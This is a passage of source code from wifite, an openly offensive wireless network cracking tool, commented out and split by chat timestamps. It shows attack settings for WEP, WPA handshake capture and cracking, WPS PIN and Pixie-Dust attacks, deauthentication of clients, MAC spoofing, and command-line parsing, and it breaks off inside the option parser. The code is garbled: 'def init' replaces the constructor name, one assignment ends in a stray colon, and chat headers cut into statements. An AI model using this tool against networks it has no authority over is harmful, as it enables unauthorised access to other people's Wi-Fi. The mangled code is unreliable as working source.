# ., [18.01.2024 4:16]
# #!/usr/bin/python

# # -*- coding: utf-8 -*-

# """
#     wifite

#     author: derv82 at gmail
#     author: bwall @botnet_hunter (ballastsec@gmail.com)
#     author: drone @dronesec (ballastsec@gmail.com)

#     Thanks to everyone that contributed to this project.
#     If you helped in the past and want your name here, shoot me an email

#     Licensed under the GNU General Public License Version 2 (GNU GPL v2),
#         available at: http://www.gnu.org/licenses/gpl-2.0.txt

#     (C) 2011 Derv Merkler

#     Ballast Security additions
#     -----------------
#      - No longer requires to be root to run -cracked
#      - cracked.txt changed to cracked.csv and stored in csv format(easier to read, no \x00s)
#          - Backwards compatibility
#      - Made a run configuration class to handle globals
#      - Added -recrack (shows already cracked APs in the possible targets, otherwise hides them)
#      - Changed the updater to grab files from GitHub and not Google Code
#      - Use argparse to parse command-line arguments
#      - -wepca flag now properly initialized if passed through CLI
#      - parse_csv uses python csv library
#     -----------------


#     TODO:

#     Restore same command-line switch names from v1

#     If device already in monitor mode, check for and, if applicable, use macchanger

#      WPS
#      * Mention reaver automatically resumes sessions
#      * Warning about length of time required for WPS attack (*hours*)
#      * Show time since last successful attempt
#      * Percentage of tries/attempts ?
#      * Update code to work with reaver 1.4 ("x" sec/att)

#      WEP:
#      * ability to pause/skip/continue    (done, not tested)
#      * Option to capture only IVS packets (uses --output-format ivs,csv)
#        - not compatible on older aircrack-ng's.
#            - Just run "airodump-ng --output-format ivs,csv", "No interface specified" = works
#          - would cut down on size of saved .caps

#      reaver:
#           MONITOR ACTIVITY!
#           - Enter ESSID when executing (?)
#        - Ensure WPS key attempts have begun.
#        - If no attempts can be made, stop attack

#        - During attack, if no attempts are made within X minutes, stop attack & Print

#        - Reaver's output when unable to associate:
#          [!] WARNING: Failed to associate with AA:BB:CC:DD:EE:FF (ESSID: ABCDEF)
#        - If failed to associate for x minutes, stop attack (same as no attempts?)

#     MIGHTDO:
#       * WPA - crack (pyrit/cowpatty) (not really important)
#       * Test injection at startup? (skippable via command-line switch)

# """

# # ############
# # LIBRARIES #
# #############

# import csv  # Exporting and importing cracked aps
# import os  # File management
# import time  # Measuring attack intervals
# import random  # Generating a random MAC address.
# import errno  # Error numbers

# from sys import argv  # Command-line arguments
# from sys import stdout  # Flushing

# from shutil import copy  # Copying .cap files

# # Executing, communicating with, killing processes
# from subprocess import Popen, call, PIPE
# from signal import SIGINT, SIGTERM

# import re  # RegEx, Converting SSID to filename
# import argparse  # arg parsing
# import urllib  # Check for new versions from the repo
# import abc  # abstract base class libraries for attack templates


# ################################
# # GLOBAL VARIABLES IN ALL CAPS #
# ################################

# # Console colors
# W = '\033[0m'  # white (normal)
# R = '\033[31m'  # red
# G = '\033[32m'  # green
# O = '\033[33m'  # orange
# B = '\033[34m'  # blue
# P = '\033[35m'  # purple
# C = '\033[36m'  # cyan
# GR = '\033[37m'  # gray

# # /dev/null, send output from programs so they don't print to screen.
# DN = open(os.devnull, 'w')
# ERRLOG = open(os.devnull, 'w')
# OUTLOG = open(os.devnull, 'w')

# ###################
# # DATA STRUCTURES #
# ###################


# class CapFile:
#     """
#         Holds data about an access point's .cap file, including AP's ESSID & BSSID.
#     """

#     def init(self, filename, ssid, bssid):
#         self.filename = filename
#         self.ssid = ssid
#         self.bssid = bssid

# ., [18.01.2024 4:16]
# class Target:
#     """
#         Holds data for a Target (aka Access Point aka Router)
#     """

#     def init(self, bssid, power, data, channel, encryption, ssid):
#         self.bssid = bssid
#         self.power = power
#         self.data = data
#         self.channel = channel
#         self.encryption = encryption
#         self.ssid = ssid
#         self.wps = False  # Default to non-WPS-enabled router.
#         self.key = ''


# class Client:
#     """
#         Holds data for a Client (device connected to Access Point/Router)
#     """

#     def init(self, bssid, station, power):
#         self.bssid = bssid
#         self.station = station
#         self.power = power


# class RunConfiguration:
#     """
#         Configuration for this rounds of attacks
#     """

#     def init(self):
#         self.REVISION = 89:
#         self.PRINTED_SCANNING = False

#         self.TX_POWER = 0  # Transmit power for wireless interface, 0 uses default power

#         # WPA variables
#         self.WPA_DISABLE = False  # Flag to skip WPA handshake capture
#         self.WPA_STRIP_HANDSHAKE = True  # Use pyrit or tshark (if applicable) to strip handshake
#         self.WPA_DEAUTH_COUNT = 1  # Count to send deauthentication packets
#         self.WPA_DEAUTH_TIMEOUT = 10  # Time to wait between deauthentication bursts (in seconds)
#         self.WPA_ATTACK_TIMEOUT = 500  # Total time to allow for a handshake attack (in seconds)
#         self.WPA_HANDSHAKE_DIR = 'hs'  # Directory in which handshakes .cap files are stored
#         # Strip file path separator if needed
#         if self.WPA_HANDSHAKE_DIR != '' and self.WPA_HANDSHAKE_DIR[-1] == os.sep:
#             self.WPA_HANDSHAKE_DIR = self.WPA_HANDSHAKE_DIR[:-1]

#         self.WPA_FINDINGS = []  # List of strings containing info on successful WPA attacks
#         self.WPA_DONT_CRACK = False  # Flag to skip cracking of handshakes
#         if os.path.exists('/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'):
#             self.WPA_DICTIONARY = '/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
#         elif os.path.exists('/usr/share/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'):
#             self.WPA_DICTIONARY = '/usr/share/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
#         elif os.path.exists('/usr/share/wordlists/fern-wifi/common.txt'):
#             self.WPA_DICTIONARY = '/usr/share/wordlists/fern-wifi/common.txt'
#         else:
#             self.WPA_DICTIONARY = ''

#         # Various programs to use when checking for a four-way handshake.
#         # True means the program must find a valid handshake in order for wifite to recognize a handshake.
#         # Not finding handshake short circuits result (ALL 'True' programs must find handshake)
#         self.WPA_HANDSHAKE_TSHARK = True  # Checks for sequential 1,2,3 EAPOL msg packets (ignores 4th)
#         self.WPA_HANDSHAKE_PYRIT = False  # Sometimes crashes on incomplete dumps, but accurate.
#         self.WPA_HANDSHAKE_AIRCRACK = True  # Not 100% accurate, but fast.
#         self.WPA_HANDSHAKE_COWPATTY = False  # Uses more lenient "nonstrict mode" (-2)

#         # WEP variables
#         self.WEP_DISABLE = False  # Flag for ignoring WEP networks
#         self.WEP_PPS = 600  # packets per second (Tx rate)
#         self.WEP_TIMEOUT = 600  # Amount of time to give each attack
#         self.WEP_ARP_REPLAY = True  # Various WEP-based attacks via aireplay-ng
#         self.WEP_CHOPCHOP = True  #
#         self.WEP_FRAGMENT = True  #
#         self.WEP_CAFFELATTE = True  #
#         self.WEP_P0841 = True
#         self.WEP_HIRTE = True
#         self.WEP_CRACK_AT_IVS = 10000  # Number of IVS at which we start cracking
#         self.WEP_IGNORE_FAKEAUTH = True  # When True, continues attack despite fake authentication failure
#         self.WEP_FINDINGS = []  # List of strings containing info on successful WEP attacks.
#         self.WEP_SAVE = False  # Save packets.

# [18.01.2024 4:16]
# # WPS variables
#         self.WPS_DISABLE = False  # Flag to skip WPS scan and attacks
#         self.PIXIE = False
#         self.WPS_FINDINGS = []  # List of (successful) results of WPS attacks
#         self.WPS_TIMEOUT = 660  # Time to wait (in seconds) for successful PIN attempt
#         self.WPS_RATIO_THRESHOLD = 0.01  # Lowest percentage of tries/attempts allowed (where tries > 0)
#         self.WPS_MAX_RETRIES = 0  # Number of times to re-try the same pin before giving up completely.


#         # Program variables
#         self.SHOW_ALREADY_CRACKED = False  # Says whether to show already cracked APs as options to crack
#         self.WIRELESS_IFACE = ''  # User-defined interface
#         self.MONITOR_IFACE = ''  # User-defined interface already in monitor mode
#         self.TARGET_CHANNEL = 0  # User-defined channel to scan on
#         self.TARGET_ESSID = ''  # User-defined ESSID of specific target to attack
#         self.TARGET_BSSID = ''  # User-defined BSSID of specific target to attack
#         self.IFACE_TO_TAKE_DOWN = ''  # Interface that wifite puts into monitor mode
#         # It's our job to put it out of monitor mode after the attacks
#         self.ORIGINAL_IFACE_MAC = ('', '')  # Original interface name[0] and MAC address[1] (before spoofing)
#         self.DO_NOT_CHANGE_MAC = True  # Flag for disabling MAC anonymizer
#         self.SEND_DEAUTHS = True # Flag for deauthing clients while scanning for acces points
#         self.TARGETS_REMAINING = 0  # Number of access points remaining to attack
#         self.WPA_CAPS_TO_CRACK = []  # list of .cap files to crack (full of CapFile objects)
#         self.THIS_MAC = ''  # The interfaces current MAC address.
#         self.SHOW_MAC_IN_SCAN = False  # Display MACs of the SSIDs in the list of targets
#         self.CRACKED_TARGETS = []  # List of targets we have already cracked
#         self.ATTACK_ALL_TARGETS = False  # Flag for when we want to attack *everyone*
#         self.ATTACK_MIN_POWER = 0  # Minimum power (dB) for access point to be considered a target
#         self.VERBOSE_APS = True  # Print access points as they appear
#         self.CRACKED_TARGETS = self.load_cracked()
#         old_cracked = self.load_old_cracked()
#         if len(old_cracked) > 0:
#             # Merge the results
#             for OC in old_cracked:
#                 new = True
#                 for NC in self.CRACKED_TARGETS:
#                     if OC.bssid == NC.bssid:
#                         new = False
#                         break
#                 # If Target isn't in the other list
#                 # Add and save to disk
#                 if new:
#                     self.save_cracked(OC)

#     def ConfirmRunningAsRoot(self):
#         if os.getuid() != 0:
#             print R + ' [!]' + O + ' ERROR:' + G + ' wifite' + O + ' must be run as ' + R + 'root' + W
#             print R + ' [!]' + O + ' login as root (' + W + 'su root' + O + ') or try ' + W + 'sudo ./wifite.py' + W
#             exit(1)

#     def ConfirmCorrectPlatform(self):
#         if not os.uname()[0].startswith("Linux") and not 'Darwin' in os.uname()[0]:  # OSX support, 'cause why not?
#             print O + ' [!]' + R + ' WARNING:' + G + ' wifite' + W + ' must be run on ' + O + 'linux' + W
#             exit(1)

#     def CreateTempFolder(self):
#         from tempfile import mkdtemp

#         self.temp = mkdtemp(prefix='wifite')
#         if not self.temp.endswith(os.sep):
#             self.temp += os.sep

#     def save_cracked(self, target):
#         """
#             Saves cracked access point key and info to a file.
#         """
#         self.CRACKED_TARGETS.append(target)
#         with open('cracked.csv', 'wb') as csvfile:
#             targetwriter = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
#             for target in self.CRACKED_TARGETS:
#                 targetwriter.writerow([target.bssid, target.encryption, target.ssid, target.key, target.wps])

# ., [18.01.2024 4:16]
# def load_cracked(self):
#         """
#             Loads info about cracked access points into list, returns list.
#         """
#         result = []
#         if not os.path.exists('cracked.csv'): return result
#         with open('cracked.csv', 'rb') as csvfile:
#             targetreader = csv.reader(csvfile, delimiter=',', quotechar='"')
#             for row in targetreader:
#                 t = Target(row[0], 0, 0, 0, row[1], row[2])
#                 t.key = row[3]
#                 t.wps = row[4]
#                 result.append(t)
#         return result

#     def load_old_cracked(self):
#         """
#                 Loads info about cracked access points into list, returns list.
#         """
#         result = []
#         if not os.path.exists('cracked.txt'):
#             return result
#         fin = open('cracked.txt', 'r')
#         lines = fin.read().split('\n')
#         fin.close()

#         for line in lines:
#             fields = line.split(chr(0))
#             if len(fields) <= 3:
#                 continue
#             tar = Target(fields[0], '', '', '', fields[3], fields[1])
#             tar.key = fields[2]
#             result.append(tar)
#         return result

#     def exit_gracefully(self, code=0):
#         """
#             We may exit the program at any time.
#             We want to remove the temp folder and any files contained within it.
#             Removes the temp files/folder and exists with error code "code".
#         """
#         # Remove temp files and folder
#         if os.path.exists(self.temp):
#             for f in os.listdir(self.temp):
#                 os.remove(os.path.join(self.temp, f))
#             os.rmdir(self.temp)
#         # Disable monitor mode if enabled by us
#         self.RUN_ENGINE.disable_monitor_mode()
#         # Change MAC address back if spoofed
#         mac_change_back()
#         print GR + " [+]" + W + " quitting"  # wifite will now exit"
#         print ''
#         # GTFO
#         exit(code)

#     def handle_args(self):
#         """
#             Handles command-line arguments, sets global variables.
#         """
#         set_encrypt = False
#         set_hscheck = False
#         set_wep = False
#         capfile = ''  # Filename of .cap file to analyze for handshakes

#         opt_parser = self.build_opt_parser()
#         options = opt_parser.parse_args()

#         try:
#             if not set_encrypt and (options.wpa or options.wep or options.wps):
#                 self.WPS_DISABLE = True
#                 self.WPA_DISABLE = True
#                 self.WEP_DISABLE = True
#                 set_encrypt = True
#             if options.recrack:
#                 self.SHOW_ALREADY_CRACKED = True
#                 print GR + ' [+]' + W + ' including already cracked networks in targets.'
#             if options.wpa:
#                 if options.wps:
#                     print GR + ' [+]' + W + ' targeting ' + G + 'WPA' + W + ' encrypted networks.'
#                 else:
#                     print GR + ' [+]' + W + ' targeting ' + G + 'WPA' + W + ' encrypted networks (use ' + G + '-wps' + W + ' for WPS scan)'
#                 self.WPA_DISABLE = False
#             if options.wep:
#                 print GR + ' [+]' + W + ' targeting ' + G + 'WEP' + W + ' encrypted networks'
#                 self.WEP_DISABLE = False
#             if options.wps:
#                 print GR + ' [+]' + W + ' targeting ' + G + 'WPS-enabled' + W + ' networks.'
#                 self.WPS_DISABLE = False
#             if options.pixie:
#                 print GR + ' [+]' + W + ' targeting ' + G + 'WPS-enabled' + W + ' networks.'
#                 print GR + ' [+]' + W + ' using only ' + G + 'WPS Pixie-Dust' + W + ' attack.'
#                 self.WPS_DISABLE = False
#                 self.WEP_DISABLE = True
#                 self.PIXIE = True
#             if options.channel:
#                 try:
#                     self.TARGET_CHANNEL = int(options.channel)

# ., [18.01.2024 4:16]
# except ValueError:
#                     print O + ' [!]' + R + ' invalid channel: ' + O + options.channel + W
#                 except IndexError:
#                     print O + ' [!]' + R + ' no channel given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' channel set to %s' % (G + str(self.TARGET_CHANNEL) + W)
#             if options.mac_anon:
#                 print GR + ' [+]' + W + ' mac address anonymizing ' + G + 'enabled' + W
#                 print O + '      not: only works if device is not already in monitor mode!' + W
#                 self.DO_NOT_CHANGE_MAC = False
#             if options.interface:
#                 self.WIRELESS_IFACE = options.interface
#                 print GR + ' [+]' + W + ' set interface :%s' % (G + self.WIRELESS_IFACE + W)
#             if options.monitor_interface:
#                 self.MONITOR_IFACE = options.monitor_interface
#                 print GR + ' [+]' + W + ' set interface already in monitor mode :%s' % (G + self.MONITOR_IFACE + W)
#             if options.nodeauth:
#                 self.SEND_DEAUTHS = False
#                 print GR + ' [+]' + W + ' will not deauthenticate clients while scanning%s' % W
#             if options.essid:
#                 try:
#                     self.TARGET_ESSID = options.essid
#                 except ValueError:
#                     print R + ' [!]' + O + ' no ESSID given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' targeting ESSID "%s"' % (G + self.TARGET_ESSID + W)
#             if options.bssid:
#                 try:
#                     self.TARGET_BSSID = options.bssid
#                 except ValueError:
#                     print R + ' [!]' + O + ' no BSSID given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' targeting BSSID "%s"' % (G + self.TARGET_BSSID + W)
#             if options.showb:
#                 self.SHOW_MAC_IN_SCAN = True
#                 print GR + ' [+]' + W + ' target MAC address viewing ' + G + 'enabled' + W
#             if options.all:
#                 self.ATTACK_ALL_TARGETS = True
#                 print GR + ' [+]' + W + ' targeting ' + G + 'all access points' + W
#             if options.power:
#                 try:
#                     self.ATTACK_MIN_POWER = int(options.power)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid power level: %s' % (R + options.power + W)
#                 except IndexError:
#                     print R + ' [!]' + O + ' no power level given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' minimum target power set to %s' % (G + str(self.ATTACK_MIN_POWER) + W)
#             if options.tx:
#                 try:
#                     self.TX_POWER = int(options.tx)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid TX power leve: %s' % ( R + options.tx + W)
#                 except IndexError:
#                     print R + ' [!]' + O + ' no TX power level given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' TX power level set to %s' % (G + str(self.TX_POWER) + W)
#             if options.quiet:
#                 self.VERBOSE_APS = False
#                 print GR + ' [+]' + W + ' list of APs during scan ' + O + 'disabled' + W
#             if options.check:
#                 try:
#                     capfile = options.check
#                 except IndexError:
#                     print R + ' [!]' + O + ' unable to analyze capture file' + W
#                     print R + ' [!]' + O + ' no cap file given!\n' + W
#                     self.exit_gracefully(1)
#                 else:
#                     if not os.path.exists(capfile):
#                         print R + ' [!]' + O + ' unable to analyze capture file!' + W
#                         print R + ' [!]' + O + ' file not found: ' + R + capfile + '\n' + W

# ., [18.01.2024 4:16]
# self.exit_gracefully(1)
#             if options.cracked:
#                 if len(self.CRACKED_TARGETS) == 0:
#                     print R + ' [!]' + O + ' There are no cracked access points saved to ' + R + 'cracked.db\n' + W
#                     self.exit_gracefully(1)
#                 print GR + ' [+]' + W + ' ' + W + 'previously cracked access points' + W + ':'
#                 for victim in self.CRACKED_TARGETS:
#                     if victim.wps != False:
#                         print '     %s (%s) : "%s" - Pin: %s' % (
#                         C + victim.ssid + W, C + victim.bssid + W, G + victim.key + W, G + victim.wps + W)
#                     else:
#                         print '     %s (%s) : "%s"' % (C + victim.ssid + W, C + victim.bssid + W, G + victim.key + W)
#                 print ''
#                 self.exit_gracefully(0)
#             # WPA
#             if not set_hscheck and (options.tshark or options.cowpatty or options.aircrack or options.pyrit):
#                 self.WPA_HANDSHAKE_TSHARK = False
#                 self.WPA_HANDSHAKE_PYRIT = False
#                 self.WPA_HANDSHAKE_COWPATTY = False
#                 self.WPA_HANDSHAKE_AIRCRACK = False
#                 set_hscheck = True
#             if options.strip:
#                 self.WPA_STRIP_HANDSHAKE = True
#                 print GR + ' [+]' + W + ' handshake stripping ' + G + 'enabled' + W
#             if options.wpadt:
#                 try:
#                     self.WPA_DEAUTH_TIMEOUT = int(options.wpadt)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid deauth timeout: %s' % (R + options.wpadt + W)
#                 except IndexError:
#                     print R + ' [!]' + O + ' no deauth timeout given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' WPA deauth timeout set to %s' % (G + str(self.WPA_DEAUTH_TIMEOUT) + W)
#             if options.wpat:
#                 try:
#                     self.WPA_ATTACK_TIMEOUT = int(options.wpat)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid attack timeout: %s' % (R + options.wpat + W)
#                 except IndexError:
#                     print R + ' [!]' + O + ' no attack timeout given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' WPA attack timeout set to %s' % (G + str(self.WPA_ATTACK_TIMEOUT) + W)
#             if options.crack:
#                 self.WPA_DONT_CRACK = False
#                 print GR + ' [+]' + W + ' WPA cracking ' + G + 'enabled' + W
#                 if options.dic:
#                     try:
#                         self.WPA_DICTIONARY = options.dic
#                     except IndexError:
#                         print R + ' [!]' + O + ' no WPA dictionary given!'
#                     else:
#                         if os.path.exists(options.dic):
#                             print GR + ' [+]' + W + ' WPA dictionary set to %s' % (G + self.WPA_DICTIONARY + W)
#                         else:
#                             print R + ' [!]' + O + ' WPA dictionary file not found: %s' % (options.dic)
#                 else:
#                     print R + ' [!]' + O + ' WPA dictionary file not given!'
#                     self.exit_gracefully(1)
#             if options.tshark:
#                 self.WPA_HANDSHAKE_TSHARK = True
#                 print GR + ' [+]' + W + ' tshark handshake verification ' + G + 'enabled' + W
#             if options.pyrit:
#                 self.WPA_HANDSHAKE_PYRIT = True
#                 print GR + ' [+]' + W + ' pyrit handshake verification ' + G + 'enabled' + W
#             if options.aircrack:
#                 self.WPA_HANDSHAKE_AIRCRACK = True
#                 print GR + ' [+]' + W + ' aircrack handshake verification ' + G + 'enabled' + W
#             if options.cowpatty:
#                 self.WPA_HANDSHAKE_COWPATTY = True
#                 print GR + ' [+]' + W + ' cowpatty handshake verification ' + G + 'enabled' + W

# ., [18.01.2024 4:16]
# # WEP
#             if not set_wep and options.chopchop or options.fragment or options.caffeelatte or options.arpreplay \
#                     or options.p0841 or options.hirte:
#                 self.WEP_CHOPCHOP = False
#                 self.WEP_ARPREPLAY = False
#                 self.WEP_CAFFELATTE = False
#                 self.WEP_FRAGMENT = False
#                 self.WEP_P0841 = False
#                 self.WEP_HIRTE = False
#             if options.chopchop:
#                 print GR + ' [+]' + W + ' WEP chop-chop attack ' + G + 'enabled' + W
#                 self.WEP_CHOPCHOP = True
#             if options.fragment:
#                 print GR + ' [+]' + W + ' WEP fragmentation attack ' + G + 'enabled' + W
#                 self.WEP_FRAGMENT = True
#             if options.caffeelatte:
#                 print GR + ' [+]' + W + ' WEP caffe-latte attack ' + G + 'enabled' + W
#                 self.WEP_CAFFELATTE = True
#             if options.arpreplay:
#                 print GR + ' [+]' + W + ' WEP arp-replay attack ' + G + 'enabled' + W
#                 self.WEP_ARPREPLAY = True
#             if options.p0841:
#                 print GR + ' [+]' + W + ' WEP p0841 attack ' + G + 'enabled' + W
#                 self.WEP_P0841 = True
#             if options.hirte:
#                 print GR + ' [+]' + W + ' WEP hirte attack ' + G + 'enabled' + W
#                 self.WEP_HIRTE = True
#             if options.fakeauth:
#                 print GR + ' [+]' + W + ' ignoring failed fake-authentication ' + R + 'disabled' + W
#                 self.WEP_IGNORE_FAKEAUTH = False
#             if options.wepca:
#                 try:
#                     self.WEP_CRACK_AT_IVS = int(options.wepca)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid number: %s' % ( R + options.wepca + W )
#                 except IndexError:
#                     print R + ' [!]' + O + ' no IV number specified!' + W
#                 else:
#                     print GR + ' [+]' + W + ' Starting WEP cracking when IV\'s surpass %s' % (
#                     G + str(self.WEP_CRACK_AT_IVS) + W)
#             if options.wept:
#                 try:
#                     self.WEP_TIMEOUT = int(options.wept)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid timeout: %s' % (R + options.wept + W)
#                 except IndexError:
#                     print R + ' [!]' + O + ' no timeout given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' WEP attack timeout set to %s' % (
#                     G + str(self.WEP_TIMEOUT) + " seconds" + W)
#             if options.pps:
#                 try:
#                     self.WEP_PPS = int(options.pps)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid value: %s' % (R + options.pps + W)
#                 except IndexError:
#                     print R + ' [!]' + O + ' no value given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' packets-per-second rate set to %s' % (
#                     G + str(options.pps) + " packets/sec" + W)
#             if options.wepsave:
#                 self.WEP_SAVE = True
#                 print GR + ' [+]' + W + ' WEP .cap file saving ' + G + 'enabled' + W

#             # WPS
#             if options.wpst:
#                 try:
#                     self.WPS_TIMEOUT = int(options.wpst)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid timeout: %s' % (R + options.wpst + W)
#                 except IndexError:
#                     print R + ' [!]' + O + ' no timeout given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' WPS attack timeout set to %s' % (
#                     G + str(self.WPS_TIMEOUT) + " seconds" + W)
#             if options.wpsratio:
#                 try:

#  [18.01.2024 4:16]
# self.WPS_RATIO_THRESHOLD = float(options.wpsratio)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid percentage: %s' % (R + options.wpsratio + W)
#                 except IndexError:
#                     print R + ' [!]' + O + ' no ratio given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' minimum WPS tries/attempts threshold set to %s' % (
#                     G + str(self.WPS_RATIO_THRESHOLD) + "" + W)
#             if options.wpsretry:
#                 try:
#                     self.WPS_MAX_RETRIES = int(options.wpsretry)
#                 except ValueError:
#                     print R + ' [!]' + O + ' invalid number: %s' % (R + options.wpsretry + W)
#                 except IndexError:
#                     print R + ' [!]' + O + ' no number given!' + W
#                 else:
#                     print GR + ' [+]' + W + ' WPS maximum retries set to %s' % (
#                     G + str(self.WPS_MAX_RETRIES) + " retries" + W)

#         except IndexError:
#             print '\nindexerror\n\n'

#         if capfile != '':
#             self.RUN_ENGINE.analyze_capfile(capfile)
#         print ''

#     def build_opt_parser(self):
#         """ Options are doubled for backwards compatability; will be removed soon and
#             fully moved to GNU-style
#         """
#         option_parser = argparse.ArgumentParser()

#         # set commands
#         command_group = option_parser.add_argument_group('COMMAND')
#         command_group.add_argument('--check', help='Check capfile [file] for handshakes.', action='store', dest='check')
#         command_group.add_argument('-check', action='store', dest='check', help=argparse.SUPPRESS)
#         command_group.add_argument('--cracked', help='Display previously cracked access points.', action='store_true',
#                                    dest='cracked')
#         command_group.add_argument('-cracked', help=argparse.SUPPRESS, action='store_true', dest='cracked')
#         command_group.add_argument('--recrack', help='Include already cracked networks in targets.',
#                                    action='store_true', dest='recrack')
#         command_group.add_argument('-recrack', help=argparse.SUPPRESS, action='store_true', dest='recrack')

#         # set global
#         global_group = option_parser.add_argument_group('GLOBAL')
#         global_group.add_argument('--all', help='Attack all targets.', default=False, action='store_true', dest='all')
#         global_group.add_argument('-all', help=argparse.SUPPRESS, default=False, action='store_true', dest='all')
#         global_group.add_argument('-i', help='Wireless interface for capturing.', action='store', dest='interface')
#         global_group.add_argument('--mac', help='Anonymize MAC address.', action='store_true', default=False,
#                                   dest='mac_anon')
#         global_group.add_argument('-mac', help=argparse.SUPPRESS, action='store_true', default=False, dest='mac_anon')
#         global_group.add_argument('--mon-iface', help='Interface already in monitor mode.', action='store',
#                                   dest='monitor_interface')
#         global_group.add_argument('-c', help='Channel to scan for targets.', action='store', dest='channel')
#         global_group.add_argument('-e', help='Target a specific access point by ssid (name).', action='store',
#                                   dest='essid')
#         global_group.add_argument('-b', help='Target a specific access point by bssid (mac).', action='store',
#                                   dest='bssid')
#         global_group.add_argument('--showb', help='Display target BSSIDs after scan.', action='store_true',
#                                   dest='showb')
#         global_group.add_argument('-showb', help=argparse.SUPPRESS, action='store_true', dest='showb')

# ., [18.01.2024 4:16]
# global_group.add_argument('--nodeauth', help='Do not deauthenticate clients while scanning', action='store_true', dest='nodeauth')
#         global_group.add_argument('--power', help='Attacks any targets with signal strength > [pow].', action='store',
#                                   dest='power')
#         global_group.add_argument('-power', help=argparse.SUPPRESS, action='store', dest='power')
#         global_group.add_argument('--tx', help='Set adapter TX power level.', action='store', dest='tx')
#         global_group.add_argument('-tx', help=argparse.SUPPRESS, action='store', dest='tx')
#         global_group.add_argument('--quiet', help='Do not print list of APs during scan.', action='store_true',
#                                   dest='quiet')
#         global_group.add_argument('-quiet', help=argparse.SUPPRESS, action='store_true', dest='quiet')
#         # set wpa commands
#         wpa_group = option_parser.add_argument_group('WPA')
#         wpa_group.add_argument('--wpa', help='Only target WPA networks (works with --wps --wep).', default=False,
#                                action='store_true', dest='wpa')
#         wpa_group.add_argument('-wpa', help=argparse.SUPPRESS, default=False, action='store_true', dest='wpa')
#         wpa_group.add_argument('--wpat', help='Time to wait for WPA attack to complete (seconds).', action='store',
#                                dest='wpat')
#         wpa_group.add_argument('-wpat', help=argparse.SUPPRESS, action='store', dest='wpat')
#         wpa_group.add_argument('--wpadt', help='Time to wait between sending deauth packets (seconds).', action='store',
#                                dest='wpadt')
#         wpa_group.add_argument('-wpadt', help=argparse.SUPPRESS, action='store', dest='wpadt')
#         wpa_group.add_argument('--strip', help='Strip handshake using tshark or pyrit.', default=False,
#                                action='store_true', dest='strip')
#         wpa_group.add_argument('-strip', help=argparse.SUPPRESS, default=False, action='store_true', dest='strip')
#         wpa_group.add_argument('--crack', help='Crack WPA handshakes using [dic] wordlist file.', action='store_true',
#                                dest='crack')
#         wpa_group.add_argument('-crack', help=argparse.SUPPRESS, action='store_true', dest='crack')
#         wpa_group.add_argument('--dict', help='Specificy dictionary to use when cracking WPA.', action='store',
#                                dest='dic')
#         wpa_group.add_argument('-dict', help=argparse.SUPPRESS, action='store', dest='dic')
#         wpa_group.add_argument('--aircrack', help='Verify handshake using aircrack.', default=False,
#                                action='store_true', dest='aircrack')
#         wpa_group.add_argument('-aircrack', help=argparse.SUPPRESS, default=False, action='store_true', dest='aircrack')
#         wpa_group.add_argument('--pyrit', help='Verify handshake using pyrit.', default=False, action='store_true',
#                                dest='pyrit')
#         wpa_group.add_argument('-pyrit', help=argparse.SUPPRESS, default=False, action='store_true', dest='pyrit')
#         wpa_group.add_argument('--tshark', help='Verify handshake using tshark.', default=False, action='store_true',
#                                dest='tshark')
#         wpa_group.add_argument('-tshark', help=argparse.SUPPRESS, default=False, action='store_true', dest='tshark')
#         wpa_group.add_argument('--cowpatty', help='Verify handshake using cowpatty.', default=False,
#                                action='store_true', dest='cowpatty')
#         wpa_group.add_argument('-cowpatty', help=argparse.SUPPRESS, default=False, action='store_true', dest='cowpatty')
#         # set WEP commands
#         wep_group = option_parser.add_argument_group('WEP')
#         wep_group.add_argument('--wep', help='Only target WEP networks.', default=False, action='store_true',

# ., [18.01.2024 4:16]
# dest='wep')
#         wep_group.add_argument('-wep', help=argparse.SUPPRESS, default=False, action='store_true', dest='wep')
#         wep_group.add_argument('--pps', help='Set the number of packets per second to inject.', action='store',
#                                dest='pps')
#         wep_group.add_argument('-pps', help=argparse.SUPPRESS, action='store', dest='pps')
#         wep_group.add_argument('--wept', help='Sec to wait for each attack, 0 implies endless.', action='store',
#                                dest='wept')
#         wep_group.add_argument('-wept', help=argparse.SUPPRESS, action='store', dest='wept')
#         wep_group.add_argument('--chopchop', help='Use chopchop attack.', default=False, action='store_true',
#                                dest='chopchop')
#         wep_group.add_argument('-chopchop', help=argparse.SUPPRESS, default=False, action='store_true', dest='chopchop')
#         wep_group.add_argument('--arpreplay', help='Use arpreplay attack.', default=False, action='store_true',
#                                dest='arpreplay')
#         wep_group.add_argument('-arpreplay', help=argparse.SUPPRESS, default=False, action='store_true',
#                                dest='arpreplay')
#         wep_group.add_argument('--fragment', help='Use fragmentation attack.', default=False, action='store_true',
#                                dest='fragment')
#         wep_group.add_argument('-fragment', help=argparse.SUPPRESS, default=False, action='store_true', dest='fragment')
#         wep_group.add_argument('--caffelatte', help='Use caffe-latte attack.', default=False, action='store_true',
#                                dest='caffeelatte')
#         wep_group.add_argument('-caffelatte', help=argparse.SUPPRESS, default=False, action='store_true',
#                                dest='caffeelatte')
#         wep_group.add_argument('--p0841', help='Use P0842 attack.', default=False, action='store_true', dest='p0841')
